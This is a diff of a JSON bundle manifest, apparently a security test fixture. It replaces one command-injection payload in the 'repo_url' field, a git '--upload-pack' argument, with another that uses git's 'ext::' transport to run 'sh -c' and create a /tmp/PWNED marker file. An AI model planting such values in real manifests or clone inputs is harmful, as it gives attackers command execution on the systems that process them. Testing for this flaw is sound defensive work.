@@ -12,7 +12,7 @@
       "name": "mcp-working",
       "description": "Cross-repo MCP workspace conductor bundle (spec + WG + python-sdk + typescript-sdk) 2",
       "kind": "bundle",
-      "repo_url": "--upload-pack=/bin/sh -c 'touch /tmp/PWNED'",
+      "repo_url": "ext::sh -c 'touch /tmp/PWNED >&2'",
       "repo_ref": "main",
       "repo_path": "packs/mcp-working"
     }
